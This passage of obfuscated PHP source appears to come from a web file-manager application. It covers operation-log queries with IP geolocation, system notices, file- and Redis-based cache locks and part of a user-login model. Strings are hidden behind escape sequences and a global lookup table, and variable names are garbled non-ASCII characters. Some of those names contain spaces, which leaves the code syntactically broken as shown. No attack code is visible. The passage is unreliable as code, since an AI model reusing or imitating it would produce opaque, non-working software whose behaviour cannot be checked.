$Õ˚¯…¸; } else { $©˜÷êê™ = array($¶´≥–í [1196] => $©˜÷êê™, $¶´≥–í [2245] => $Õ˚¯…¸); } } $©˜÷êê™ = array($¶´≥–í [1648] => Session::sign(), $¶´≥–í [1649] => $è™œ”ßŸ, $¶´≥–í [43] => $Å÷ªœŒÉ, $¶´≥–í [1651] => json_encode($©˜÷êê™)); parent::add($©˜÷êê™); } public function remove($ñ”ºó˘Ç) { $this->where(array($_SERVER[Á≈ ä ∞][428] => $ñ”ºó˘Ç))->delete(); } private function _makeOrder($‚âôÿ∏‘ = '') { $’Ñ™˛’Ä =& $_SERVER[Á≈ ä ∞]; $∞·Ü∑ßÌ = $’Ñ™˛’Ä[210]; $›·∑Ç÷± = array($’Ñ™˛’Ä[459] => $’Ñ™˛’Ä[460], $’Ñ™˛’Ä[461] => $’Ñ™˛’Ä[462]); $ÍÇ™µ≤ı = Input::get($’Ñ™˛’Ä[467], $’Ñ™˛’Ä[17], $’Ñ™˛’Ä[1999], array($’Ñ™˛’Ä[1921], $’Ñ™˛’Ä[461])); $ÍÇ™µ≤ı = $›·∑Ç÷±[$ÍÇ™µ≤ı]; $‚âôÿ∏‘ = $‚âôÿ∏‘ . "{$∞·Ü∑ßÌ}\40{$ÍÇ™µ≤ı}"; return $this->order($‚âôÿ∏‘); } public function get($∫Àç√ŸÖ = '') { $¨„À∫¨≤ =& $_SERVER[Á≈ ä ∞]; if (!$∫Àç√ŸÖ) { show_json(array()); } $á…∂âÒâ = array(); if ($∫Àç√ŸÖ[$¨„À∫¨≤[1658]]) { $á…∂âÒâ[$¨„À∫¨≤[1658]] = $∫Àç√ŸÖ[$¨„À∫¨≤[1658]]; } if (isset($∫Àç√ŸÖ[$¨„À∫¨≤[768]])) { $ö◊Ãï˜ü = $∫Àç√ŸÖ[$¨„À∫¨≤[768]]; $ «éÎØÖ = isset($∫Àç√ŸÖ[$¨„À∫¨≤[506]]) ? $∫Àç√ŸÖ[$¨„À∫¨≤[506]] : time(); $á…∂âÒâ[$¨„À∫¨≤[210]] = array($¨„À∫¨≤[342], array($ö◊Ãï˜ü, $ «éÎØÖ)); } if ($∫Àç√ŸÖ[$¨„À∫¨≤[43]]) { $ã˝Öœ˜õ = explode($¨„À∫¨≤[60], $∫Àç√ŸÖ[$¨„À∫¨≤[43]]); $∞’î‡Ó≠ = $this->typeFile(); $≤òﬂﬁÃ∞ = array(); foreach ($ã˝Öœ˜õ as $≤ÍÌÄ¯Œ) { $≤òﬂﬁÃ∞[] = $≤ÍÌÄ¯Œ; if (isset($∞’î‡Ó≠[$≤ÍÌÄ¯Œ])) { $≤òﬂﬁÃ∞ = array_merge($≤òﬂﬁÃ∞, $∞’î‡Ó≠[$≤ÍÌÄ¯Œ]); } } $≤òﬂﬁÃ∞ = array_unique($≤òﬂﬁÃ∞); if ($≤òﬂﬁÃ∞) { $á…∂âÒâ[$¨„À∫¨≤[43]] = array($¨„À∫¨≤[17], $≤òﬂﬁÃ∞); } } else { $á…∂âÒâ[$¨„À∫¨≤[43]] = array($¨„À∫¨≤[2246], $¨„À∫¨≤[2247]); } if (!empty($∫Àç√ŸÖ[$¨„À∫¨≤[2245]])) { $á…∂âÒâ[$¨„À∫¨≤[462]] = array($¨„À∫¨≤[392], "\x25{$∫Àç√ŸÖ[$¨„À∫¨≤[2245]]}\x25"); } $£…Ïœ◊œ = $this->_makeOrder()->where($á…∂âÒâ)->selectPage(); if (empty($£…Ïœ◊œ[$¨„À∫¨≤[378]])) { show_json(array(), !0, $£…Ïœ◊œ[$¨„À∫¨≤[375]]); } $£…Ïœ◊œ[$¨„À∫¨≤[378]] = $this->logList($£…Ïœ◊œ[$¨„À∫¨≤[378]]); return $£…Ïœ◊œ; } private function ipAddress(&$¡æ©æÿØ) { $Ê˚…‡∆Ã =& $_SERVER[Á≈ ä ∞]; if (!empty($¡æ©æÿØ[$Ê˚…‡∆Ã[2245]])) { $À«ë÷¿≥ = IpLocation::get($¡æ©æÿØ[$Ê˚…‡∆Ã[2245]]); } else { $À«ë÷¿≥ = LNG($Ê˚…‡∆Ã[2248]); } $¡æ©æÿØ[$Ê˚…‡∆Ã[2249]] = $À«ë÷¿≥; } private function descZipDownload($ƒŒÈÆﬁÍ, &$÷Úç‹¯£) { $∂≤°˛ïÿ =& $_SERVER[Á≈ ä ∞]; if (!isset($ƒŒÈÆﬁÍ[$∂≤°˛ïÿ[2250]])) { return; } $û¯Á≈•À = json_decode($ƒŒÈÆﬁÍ[$∂≤°˛ïÿ[2250]], !0); foreach ($û¯Á≈•À as $±ﬁÖ´∏´) { try { $°™ñë≠ë = IO::infoFull($±ﬁÖ´∏´[$∂≤°˛ïÿ[94]]); } catch (Exception $ïá©»¥‘) { continue; } $ƒŒÈÆﬁÍ[$∂≤°˛ïÿ[94]] = $±ﬁÖ´∏´[$∂≤°˛ïÿ[94]]; $÷Úç‹¯£[] = $ƒŒÈÆﬁÍ[$∂≤°˛ïÿ[411]] = $°™ñë≠ë[$∂≤°˛ïÿ[411]]; $÷Úç‹¯£[] = $ƒŒÈÆﬁÍ[$∂≤°˛ïÿ[2053]] = $°™ñë≠ë[$∂≤°˛ïÿ[441]]; break; } return $ƒŒÈÆﬁÍ; } private function getSourceList(&$¶◊åù¨ò) { $Ñ˜òú¢« =& $_SERVER[Á≈ ä ∞]; $ÑãÈæœÑ = array(); foreach ($¶◊åù¨ò as $Í©âÊåÃ => $úõêÜ¥) { $ƒÈëÍº∆ = json_decode($úõêÜ¥[$Ñ˜òú¢«[462]], !0); if ($úõêÜ¥[$Ñ˜òú¢«[43]] == $Ñ˜òú¢«[1804]) { $ƒÈëÍº∆ = $this->descZipDownload($ƒÈëÍº∆, $ÑãÈæœÑ); $¶◊åù¨ò[$Í©âÊåÃ][$Ñ˜òú¢«[462]] = json_encode($ƒÈëÍº∆); continue; } if (strpos($úõêÜ¥[$Ñ˜òú¢«[43]], $Ñ˜òú¢«[2055]) !== 0) { if (!isset($ƒÈëÍº∆[$Ñ˜òú¢«[94]]) || strpos($úõêÜ¥[$Ñ˜òú¢«[43]], $Ñ˜òú¢«[2251]) !== 0) { continue; } try { $è‹°·† = IO::infoFull($ƒÈëÍº∆[$Ñ˜òú¢«[94]]); } catch (Exception $õÛ√ŒÁô) { continue; } $ÑãÈæœÑ[] = $ƒÈëÍº∆[$Ñ˜òú¢«[411]] = $è‹°·†[$Ñ˜òú¢«[411]]; $ÑãÈæœÑ[] = $ƒÈëÍº∆[$Ñ˜òú¢«[2053]] = $è‹°·†[$Ñ˜òú¢«[441]]; $¶◊åù¨ò[$Í©âÊåÃ][$Ñ˜òú¢«[462]] = json_encode($ƒÈëÍº∆); continue; } $ÑãÈæœÑ[] = $ƒÈëÍº∆[$Ñ˜òú¢«[411]]; $ÑãÈæœÑ[] = $ƒÈëÍº∆[$Ñ˜òú¢«[2053]]; if ($ƒÈëÍº∆[$Ñ˜òú¢«[43]] == $Ñ˜òú¢«[566]) { $ÑãÈæœÑ[] = $ƒÈëÍº∆[$Ñ˜òú¢«[462]][$Ñ˜òú¢«[1163]]; $ÑãÈæœÑ[] = $ƒÈëÍº∆[$Ñ˜òú¢«[462]][$Ñ˜òú¢«[1164]]; } if ($ƒÈëÍº∆[$Ñ˜òú¢«[43]] == $Ñ˜òú¢«[2063]) { $ÑãÈæœÑ[] = $ƒÈëÍº∆[$Ñ˜òú¢«[462]][$Ñ˜òú¢«[411]]; } } if (!$ÑãÈæœÑ) { return array(); } return Model($Ñ˜òú¢«[832])->sourceListInfo($ÑãÈæœÑ, !0); } private function logList($é·©øÇ’) { $πËœ—¶˘ =& $_SERVER[Á≈ ä ∞]; $÷ıõ˝Ìú = array_to_keyvalue($é·©øÇ’, $πËœ—¶˘[22], $πËœ—¶˘[1658]); $∂©ô∏Ê† = Model($πËœ—¶˘[544])->userListInfo(array_unique($÷ıõ˝Ìú)); $ç˙ÎÏ∏‘ = $this->getSourceList($é·©øÇ’); $ÁÓ”ÔÒ÷ = $this->typeAll(); $π˘∏çèı = array(); $≤—Ïöûë = array(); foreach ($é·©øÇ’ as $®˚ŒıÍˆ => $©§éíÄÏ) { $¯ †‘œ˙ = $©§éíÄÏ[$πËœ—¶˘[43]]; $ÊÆÊ†ß∫ = isset($∂©ô∏Ê†[$©§éíÄÏ[$πËœ—¶˘[1658]]]) ? $∂©ô∏Ê†[$©§éíÄÏ[$πËœ—¶˘[1658]]] : !1; $∂ îôÃ¸ = strpos($¯ †‘œ˙, $πËœ—¶˘[2252]) === 0 ? LNG($πËœ—¶˘[2253]) : LNG($πËœ—¶˘[2248]); $©§éíÄÏ[$πËœ—¶˘[42]] = isset($ÊÆÊ†ß∫[$πËœ—¶˘[42]]) ? $ÊÆÊ†ß∫[$πËœ—¶˘[42]] : LNG($πËœ—¶˘[2248]); $©§éíÄÏ[$πËœ—¶˘[551]] = isset($ÊÆÊ†ß∫[$πËœ—¶˘[551]]) ? $ÊÆÊ†ß∫[$πËœ—¶˘[551]] : $πËœ—¶˘[22]; $©§éíÄÏ[$πËœ—¶˘[1557]] = isset($ÁÓ”ÔÒ÷[$¯ †‘œ˙]) ? $ÁÓ”ÔÒ÷[$¯ †‘œ˙] : $∂ îôÃ¸; $©§éíÄÏ[$πËœ—¶˘[1998]] = $ÊÆÊ†ß∫; $¸›Ã§†Ò = json_decode($©§éíÄÏ[$πËœ—¶˘[462]], !0); $©§éíÄÏ[$πËœ—¶˘[2245]] = isset($¸›Ã§†Ò[$πËœ—¶˘[2245]]) ? $¸›Ã§†Ò[$πËœ—¶˘[2245]] : $πËœ—¶˘[22]; $©§éíÄÏ[$πËœ—¶˘[2249]] = IpLocation::get($©§éíÄÏ[$πËœ—¶˘[2245]]); if (strpos($¯ †‘œ˙, $πËœ—¶˘[2055]) === 0 || isset($¸›Ã§†Ò[$πËœ—¶˘[2053]])) { $¸›Ã§†Ò[$πËœ—¶˘[96]] = $ç˙ÎÏ∏‘[$¸›Ã§†Ò[$πËœ—¶˘[411]]]; $¸›Ã§†Ò[$πËœ—¶˘[2068]] = $ç˙ÎÏ∏‘[$¸›Ã§†Ò[$πËœ—¶˘[2053]]]; if ($¸›Ã§†Ò[$πËœ—¶˘[43]] == $πËœ—¶˘[566]) { $¸›Ã§†Ò[$πËœ—¶˘[462]][$πËœ—¶˘[1163]] = $ç˙ÎÏ∏‘[$¸›Ã§†Ò[$πËœ—¶˘[462]][$πËœ—¶˘[1163]]]; $¸›Ã§†Ò[$πËœ—¶˘[462]][$πËœ—¶˘[1164]] = $ç˙ÎÏ∏‘[$¸›Ã§†Ò[$πËœ—¶˘[462]][$πËœ—¶˘[1164]]]; } if ($¸›Ã§†Ò[$πËœ—¶˘[43]] == $πËœ—¶˘[2063]) { $¸›Ã§†Ò[$πËœ—¶˘[462]][$πËœ—¶˘[411]] = $ç˙ÎÏ∏‘[$¸›Ã§†Ò[$πËœ—¶˘[462]][$πËœ—¶˘[411]]]; } if ($¸›Ã§†Ò[$πËœ—¶˘[43]] == $πËœ—¶˘[1799]) { $¸›Ã§†Ò[$πËœ—¶˘[2068]] = $¸›Ã§†Ò[$πËœ—¶˘[96]]; $¸›Ã§†Ò[$πËœ—¶˘[2053]] = $¸›Ã§†Ò[$πËœ—¶˘[2068]][$πËœ—¶˘[411]]; $¸›Ã§†Ò[$πËœ—¶˘[96]] = !1; $¸›Ã§†Ò[$πËœ—¶˘[411]] = $πËœ—¶˘[22]; } if ($¸›Ã§†Ò[$πËœ—¶˘[96]] && $¸›Ã§†Ò[$πËœ—¶˘[96]][$πËœ—¶˘[420]] == $πËœ—¶˘[1279]) { $≤—Ïöûë[] = $©§éíÄÏ[$πËœ—¶˘[408]]; unset($é·©øÇ’[$®˚ŒıÍˆ]); continue; } if ($¸›Ã§†Ò[$πËœ—¶˘[2068]] && $¸›Ã§†Ò[$πËœ—¶˘[2068]][$πËœ—¶˘[420]] == $πËœ—¶˘[1279]) { $≤—Ïöûë[] = $©§éíÄÏ[$πËœ—¶˘[408]]; unset($é·©øÇ’[$®˚ŒıÍˆ]); continue; } } $©§éíÄÏ[$πËœ—¶˘[462]] = $¸›Ã§†Ò; unset($©§éíÄÏ[$πËœ—¶˘[2254]]); $π˘∏çèı[] = $©§éíÄÏ; } $this->clearSystemPathLog($≤—Ïöûë); return $π˘∏çèı; } private function clearSystemPathLog($Ç∞äÒë) { $Á¶â˛¨∫ =& $_SERVER[Á≈ ä ∞]; if (count($Ç∞äÒë) == 0) { return; } $€ƒ˙ÙØ‹ = array($Á¶â˛¨∫[408] => array($Á¶â˛¨∫[17], array_unique($Ç∞äÒë))); $this->where($€ƒ˙ÙØ‹)->delete(); } public function deviceList($ôØîÂπœ, $‘ˆÄ¡–Á = 0) { $àÕ¯æé¢ =& $_SERVER[Á≈ ä ∞]; $ëàıˆ˛Ø = array($àÕ¯æé¢[1658] => $ôØîÂπœ, $àÕ¯æé¢[210] => array($àÕ¯æé¢[1017], $‘ˆÄ¡–Á), $àÕ¯æé¢[43] => $àÕ¯æé¢[1773]); $ØˆÄÑµ™ = array(); $ìœËƒÙÅ = $this->field($àÕ¯æé¢[2255])->where($ëàıˆ˛Ø)->order($àÕ¯æé¢[2066])->limit(50)->select(); foreach ($ìœËƒÙÅ as $∏Ïù°±Õ => $≥≤äÊ˘—) { if ($∏Ïù°±Õ > 0 && abs($≥≤äÊ˘—[$àÕ¯æé¢[210]] - $ìœËƒÙÅ[$∏Ïù°±Õ - 1][$àÕ¯æé¢[210]]) < 5) { continue; } $æÿà»Óø = json_decode($≥≤äÊ˘—[$àÕ¯æé¢[462]], !0); $≥≤äÊ˘—[$àÕ¯æé¢[2245]] = isset($æÿà»Óø[$àÕ¯æé¢[2245]]) ? $æÿà»Óø[$àÕ¯æé¢[2245]] : $àÕ¯æé¢[22]; unset($æÿà»Óø[$àÕ¯æé¢[2245]]); $¯˙ÆîÚú = $this->deviceType($æÿà»Óø[$àÕ¯æé¢[2056]]); if (isset($ØˆÄÑµ™[$¯˙ÆîÚú])) { continue; } $≥≤äÊ˘—[$àÕ¯æé¢[2249]] = IpLocation::get($≥≤äÊ˘—[$àÕ¯æé¢[2245]]); $≥≤äÊ˘—[$àÕ¯æé¢[462]] = $æÿà»Óø; $ØˆÄÑµ™[$¯˙ÆîÚú] = $≥≤äÊ˘—; } return array_values($ØˆÄÑµ™); } public function deviceType($‡ô◊À—‚) { return $‡ô◊À—‚; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\145\x6d\56\156\x6f\x74\151\143\145\114\x69\163\x74"; public $field = array("\156\x61\155\x65", "\143\x6f\156\164\145\156\x74", "\141\165\164\x68", "\x6d\157\x64\145", "\164\151\x6d\145", "\x74\171\x70\x65", "\154\145\166\x65\154", "\x65\x6e\x61\x62\154\145", "\x73\157\162\164"); public function listData($˘Å¸»Á‘ = false, $ı≠πéË≈ = "\x73\157\x72\164", $∏›≠Œ¿π = false) { return parent::listData($˘Å¸»Á‘, $ı≠πéË≈, $∏›≠Œ¿π); } public function add($˛œ™Á¬â) { $¥®ºƒ∆ =& $_SERVER[Á≈ ä ∞]; $Äﬁ¢ÑìÓ = time(); if ($˛œ™Á¬â[$¥®ºƒ∆[26]] == $¥®ºƒ∆[2256]) { $Äﬁ¢ÑìÓ = strtotime($˛œ™Á¬â[$¥®ºƒ∆[213]]); } $˛œ™Á¬â[$¥®ºƒ∆[213]] = $Äﬁ¢ÑìÓ; return parent::insert($˛œ™Á¬â); } public function update($Å˙Ìê¿ä, $™Áø¡ù–) { $Á¿Ç…ñÆ =& $_SERVER[Á≈ ä ∞]; $™ﬂÿ…ø∑ = $this->listData($Å˙Ìê¿ä); if (!$™ﬂÿ…ø∑) { return !1; } $‚ÍìÍñﬁ = time(); if ($™Áø¡ù–[$Á¿Ç…ñÆ[26]] == $Á¿Ç…ñÆ[2256]) { $‚ÍìÍñﬁ = strtotime($™Áø¡ù–[$Á¿Ç…ñÆ[213]]); } $™Áø¡ù–[$Á¿Ç…ñÆ[213]] = $‚ÍìÍñﬁ; return parent::update($Å˙Ìê¿ä, $™Áø¡ù–); } public function remove($ÆìÇ◊¿·) { $˜ﬁ˚•®  = $this->listData($ÆìÇ◊¿·); if (!$˜ﬁ˚•®  || $˜ﬁ˚•® [$_SERVER[Á≈ ä ∞][1279]]) { return !1; } return parent::remove($ÆìÇ◊¿·); } public function sort($èã„‡≈Â, $Å£»ÂÎî) { return parent::update($èã„‡≈Â, $Å£»ÂÎî); } public function enable($ﬁÿ≤àØ·, $ﬁ©ï…ûÀ) { return parent::update($ﬁÿ≤àØ·, array($_SERVER[Á≈ ä ∞][2257] => $ﬁ©ï…ûÀ)); } private function initUserOption() { $úŒπ∑Ê =& $_SERVER[Á≈ ä ∞]; $this->optionType = $úŒπ∑Ê[2258]; $this->modelType = $úŒπ∑Ê[2259]; $this->field = array($úŒπ∑Ê[2260], $úŒπ∑Ê[42], $úŒπ∑Ê[213], $úŒπ∑Ê[43], $úŒπ∑Ê[2261], $úŒπ∑Ê[757], $úŒπ∑Ê[205]); } public function userNoticeGet($¬†”Ø◊„ = false) { $this->initUserOption(); return parent::listData($¬†”Ø◊„, $_SERVER[Á≈ ä ∞][408], !0); } public function userNoticeAdd($Ê∑∫Ïáı) { $éÊ≤°¯π =& $_SERVER[Á≈ ä ∞]; $this->initUserOption(); $®∞è±ƒÄ = $this->findByKey($éÊ≤°¯π[2260], $Ê∑∫Ïáı[$éÊ≤°¯π[408]]); if ($®∞è±ƒÄ) { return !0; } $ß¥º‚¶Ü = array($éÊ≤°¯π[2260] => $Ê∑∫Ïáı[$éÊ≤°¯π[408]], $éÊ≤°¯π[42] => $Ê∑∫Ïáı[$éÊ≤°¯π[42]], $éÊ≤°¯π[213] => $Ê∑∫Ïáı[$éÊ≤°¯π[213]], $éÊ≤°¯π[43] => isset($Ê∑∫Ïáı[$éÊ≤°¯π[43]]) ? $Ê∑∫Ïáı[$éÊ≤°¯π[43]] : 1, $éÊ≤°¯π[2261] => isset($Ê∑∫Ïáı[$éÊ≤°¯π[2261]]) ? $Ê∑∫Ïáı[$éÊ≤°¯π[2261]] : 0, $éÊ≤°¯π[757] => 0, $éÊ≤°¯π[205] => 0); return parent::insert($ß¥º‚¶Ü); } public function userNoticeEdit($êµÆ‰ö±, $ﬁÅêˆƒ¨) { $this->initUserOption(); return parent::update($êµÆ‰ö±, $ﬁÅêˆƒ¨); } } goto e»®âÖ∆Ω€; bÁè∆áø©≥: function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $ŒÈ´§¢Ñ =& $_SERVER[Á≈ ä ∞]; $ﬂºà◊…“ = $GLOBALS[$ŒÈ´§¢Ñ[16]][$ŒÈ´§¢Ñ[358]]; self::$cachePath = $ﬂºà◊…“[$ŒÈ´§¢Ñ[209]][$ŒÈ´§¢Ñ[94]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($º«ÒÿﬂË, $¡ÀÓ„ºî = 0) { $ÇºˆÕÛ =& $_SERVER[Á≈ ä ∞]; $…–ÿ–˛Ö = microtime(!0); $Ìπ˘≈òΩ = $…–ÿ–˛Ö + $¡ÀÓ„ºî + 0.0001; $ÕßÃ˝±ö = rtrim(self::$cachePath, $ÇºˆÕÛ[18]) . $ÇºˆÕÛ[866] . md5($º«ÒÿﬂË) . $ÇºˆÕÛ[863]; if (file_exists($ÕßÃ˝±ö) && filemtime($ÕßÃ˝±ö) && filemtime($ÕßÃ˝±ö) < time() - 10) { @unlink($ÕßÃ˝±ö); } do { if (file_exists($ÕßÃ˝±ö)) { cacheLockWait(); continue; } $ÿﬁ¡√ÙÂ = fopen($ÕßÃ˝±ö, $ÇºˆÕÛ[867]); if (!$ÿﬁ¡√ÙÂ) { return !1; } $ÑÓü«îÇ = flock($ÿﬁ¡√ÙÂ, LOCK_EX | LOCK_NB); self::$caches[$º«ÒÿﬂË] = array($ÇºˆÕÛ[868] => $ÿﬁ¡√ÙÂ, $ÇºˆÕÛ[209] => $ÕßÃ˝±ö); fwrite($ÿﬁ¡√ÙÂ, $Ìπ˘≈òΩ); clearstatcache(); if ($ÿﬁ¡√ÙÂ && $ÑÓü«îÇ) { return !0; } cacheLockWait(); } while (microtime(!0) < $Ìπ˘≈òΩ); $this->unlock($º«ÒÿﬂË); return !1; } public function lockGet($≈®Ù»å®) { $Óüåôæõ =& $_SERVER[Á≈ ä ∞]; $›ØîÜπ∫ = rtrim(self::$cachePath, $Óüåôæõ[18]) . $Óüåôæõ[866] . md5($≈®Ù»å®) . $Óüåôæõ[863]; return file_exists($›ØîÜπ∫); } public function unlock($ÁÙˆÆüà) { $ﬁÀÎ£éì =& $_SERVER[Á≈ ä ∞]; $‹µ¸Ò‚∞ = self::$caches[$ÁÙˆÆüà]; if (!$‹µ¸Ò‚∞) { return; } @flock($‹µ¸Ò‚∞[$ﬁÀÎ£éì[868]], LOCK_UN); @fclose($‹µ¸Ò‚∞[$ﬁÀÎ£éì[868]]); @unlink($‹µ¸Ò‚∞[$ﬁÀÎ£éì[209]]); unset(self::$caches[$ÁÙˆÆüà]); } } class CacheLockRedis { public function lock($∫˛òÔœÆ, $áÀîà∏Ø = 10) { $•≈–·åœ = Cache::init(); $≠÷Áı∂£ = microtime(!0) + $áÀîà∏Ø; while (microtime(!0) < $≠÷Áı∂£) { $ìÍù‚ΩÄ = $•≈–·åœ->get($∫˛òÔœÆ); if (!$ìÍù‚ΩÄ) { $©§¶„¢ù = $•≈–·åœ->setLock($∫˛òÔœÆ, $≠÷Áı∂£, $áÀîà∏Ø); if ($©§¶„¢ù) { return !0; } } else { if ($ìÍù‚ΩÄ < microtime(!0)) { $•≈–·åœ->set($∫˛òÔœÆ, $≠÷Áı∂£, $áÀîà∏Ø * 2); if ($•≈–·åœ->get($∫˛òÔœÆ) === $ìÍù‚ΩÄ) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($€∏˜›Úä) { return Cache::init()->get($€∏˜›Úä); } public function unlock($Ó©ÿ∏Ãﬂ) { return Cache::init()->remove($Ó©ÿ∏Ãﬂ); } } goto aœÑØ•ê◊∆; f»’å≥ê€©: class UserModel extends ModelBase { protected $tableName = "\x75\x73\x65\162"; protected $tableMeta = array("\164\141\x62\154\x65\x4e\141\x6d\145" => "\x75\163\x65\x72\137\x6d\145\x74\x61", "\x6d\145\x74\141\106\x69\145\154\144" => "\x75\x73\x65\162\111\104"); protected $simpleField = "\x75\x73\x65\162\x49\104\x2c\156\151\x63\153\x4e\x61\x6d\145\54\156\x61\155\145\54\141\166\x61\x74\141\162\54\x73\x65\170\54\163\x74\x61\x74\x75\163"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($øø˙ùìÓ) { $Óá†íÍ‰ =& $_SERVER[Á≈ ä ∞]; $ﬁÂ˝¥ ç = $Óá†íÍ‰[2273]; return array($Óá†íÍ‰[1908] => array($øø˙ùìÓ[0], $ﬁÂ˝¥ ç), $Óá†íÍ‰[1910] => array($øø˙ùìÓ[0], $ﬁÂ˝¥ ç), $Óá†íÍ‰[2274] => array($øø˙ùìÓ[0], $ﬁÂ˝¥ ç)); } protected function getInfo($–´Ê˘îÉ, $ûıòÀ—Ö = false) { $≤˜£ÇÿÛ = $this->getInfoSimple($–´Ê˘îÉ); if (!is_array($≤˜£ÇÿÛ)) { return array(); } if ($ûıòÀ—Ö) { return $this->_getInfoApply($≤˜£ÇÿÛ); } return $this->cacheFunctionGet($_SERVER[Á≈ ä ∞][1912], $–´Ê˘îÉ); } protected function getInfoFull($Ä⁄ı ˝Ó, $Ù«ÿ¬∑ƒ = false) { $˙‡…êØç = $this->getInfoSimple($Ä⁄ı ˝Ó); if (!is_array($˙‡…êØç)) { return array(); } if ($Ù«ÿ¬∑ƒ) { return $this->_getInfoApply($˙‡…êØç, !0); } return $this->cacheFunctionGet($_SERVER[Á≈ ä ∞][2275], $Ä⁄ı ˝Ó); } private function _getInfoApply($©ª‰–é€, $⁄…•÷ºì = false) { $√‰ºà◊¥ =& $_SERVER[Á≈ ä ∞]; if (!$©ª‰–é€) { return $©ª‰–é€; } $‡Âﬂ¸ÿë = md5($√‰ºà◊¥[2276] . $©ª‰–é€[$√‰ºà◊¥[892]] . $√‰ºà◊¥[2277] . $©ª‰–é€[$√‰ºà◊¥[42]]); $©ª‰–é€ = $this->_listDataApplyItem($©ª‰–é€); $ˆÁ¿≥®◊ = Model($√‰ºà◊¥[1330])->metaGet($©ª‰–é€[$√‰ºà◊¥[96]][$√‰ºà◊¥[411]]); $©ª‰–é€[$√‰ºà◊¥[2278]] = $‡Âﬂ¸ÿë; $©ª‰–é€[$√‰ºà◊¥[96]][$√‰ºà◊¥[2099]] = isset($ˆÁ¿≥®◊[$√‰ºà◊¥[2100]]) ? $ˆÁ¿≥®◊[$√‰ºà◊¥[2100]] : null; if ($⁄…•÷ºì) { $©ª‰–é€[$√‰ºà◊¥[475]] = $this->metaGet($©ª‰–é€[$√‰ºà◊¥[1658]]); } return $©ª‰–é€; } protected function getInfoSimple($¶Ωç‘úÎ, $ëÑ«©£— = false) { $óÆ¬›∆À =& $_SERVER[Á≈ ä ∞]; if (!$¶Ωç‘úÎ) { return array(); } if ($ëÑ«©£—) { $øÓ·Ç‚√ = $this->where(array($óÆ¬›∆À[1658] => intval($¶Ωç‘úÎ)))->find(); if (!is_array($øÓ·Ç‚√)) { return array(); } $øÓ·Ç‚√[$óÆ¬›∆À[552]] = Action($óÆ¬›∆À[2279])->parseUrl($øÓ·Ç‚√[$óÆ¬›∆À[552]]); return $øÓ·Ç‚√; } return $this->cacheFunctionGet($óÆ¬›∆À[1913], $¶Ωç‘úÎ); } protected function getInfoSimpleOuter($’¥æø Ö) { $®èö‡¡ñ =& $_SERVER[Á≈ ä ∞]; if (!$’¥æø Ö || $’¥æø Ö == 0) { return array($®èö‡¡ñ[1658] => $®èö‡¡ñ[207], $®èö‡¡ñ[42] => $®èö‡¡ñ[172] . LNG($®èö‡¡ñ[2280]) . $®èö‡¡ñ[174], $®èö‡¡ñ[552] => STATIC_PATH . $®èö‡¡ñ[2281]); } $≥ÒÑ™ù∑ = $this->cacheFunctionGet($®èö‡¡ñ[1913], $’¥æø Ö); $Ïè≠ö†ó = array_field_key($≥ÒÑ™ù∑, explode($®èö‡¡ñ[60], $this->simpleField)); if (!$Ïè≠ö†ó) { return array($®èö‡¡ñ[1658] => $®èö‡¡ñ[1193], $®èö‡¡ñ[42] => $®èö‡¡ñ[172] . LNG($®èö‡¡ñ[2282]) . $®èö‡¡ñ[174], $®èö‡¡ñ[552] => STATIC_PATH . $®èö‡¡ñ[2283]); } $Ïè≠ö†ó[$®èö‡¡ñ[552]] = Action($®èö‡¡ñ[2279])->parseUrl($Ïè≠ö†ó[$®èö‡¡ñ[552]]); return $Ïè≠ö†ó; } protected function groupUser($Éåªú¶£) { } public static function errorLang($Ãù˙ËÒß) { $±ï›É˜Ï =& $_SERVER[Á≈ ä ∞]; $—∫àÌ›ù = array(self::ERROR_USER_NOT_EXISTS => $±ï›É˜Ï[2284], self::ERROR_USER_PASSWORD_ERROR => $±ï›É˜Ï[2285], self::ERROR_USER_EXIST_NAME => $±ï›É˜Ï[2286], self::ERROR_USER_EXIST_PHONE => $±ï›É˜Ï[2287], self::ERROR_USER_EXIST_EMAIL => $±ï›É˜Ï[2288], self::ERROR_USER_LOGIN_LOCK => $±ï›É˜Ï[2289], self::ERROR_IP_NOT_ALLOW => $±ï›É˜Ï[2290], self::ERROR_USER_EXIST_NICKNAME => $±ï›É˜Ï[2291]); return LNG($—∫àÌ›ù[$Ãù˙ËÒß]); } public function getInfoByMeta($õá»ò”·, $¨⁄Ω£Ää) { $ßÿ±‰Ëë =& $_SERVER[Á≈ ä ∞]; $°âÿ∏ç≥ = Model($ßÿ±‰Ëë[2292])->where(array($ßÿ±‰Ëë[104] => $õá»ò”·, $ßÿ±‰Ëë[383] => $¨⁄Ω£Ää))->find(); if ($°âÿ∏ç≥) { return $this->getInfo($°âÿ∏ç≥[$ßÿ±‰Ëë[1658]]); } return !1; } public function userLoginCheck($öØ–Ã¬, $∫˘ÕìÚæ) { $≠©Ï¶¨÷ =& $_SERVER[Á≈ ä ∞]; $˘ÜπÜ·µ = $this->userLoginFind($öØ–Ã¬); if (!$˘ÜπÜ·µ) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($˘ÜπÜ·µ[$≠©Ï¶¨÷[1658]], $∫˘ÕìÚæ)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($˘ÜπÜ·µ[$≠©Ï¶¨÷[1658]]); } public function userLoginFind($Ö‹•⁄∫¿) { $πÔ®¯  =& $_SERVER[Á≈ ä ∞]; $ƒùÿ‘˘¿ = array($πÔ®¯ [42] => $Ö‹•⁄∫¿, $πÔ®¯ [551] => $Ö‹•⁄∫¿, $πÔ®¯ [314] => $Ö‹•⁄∫¿, $πÔ®¯ [2293] => $Ö‹•⁄∫¿, $πÔ®¯ [1003] => $πÔ®¯ [1005]); if ($this->nickNameRpt()) { unset($ƒùÿ‘˘¿[$πÔ®¯ [551]]); } return $this->where($ƒùÿ‘˘¿)->find(); } public function clearCache($Çµû†ìÅ) { $¨È∑≈ÙÖ =& $_SERVER[Á≈ ä ∞]; 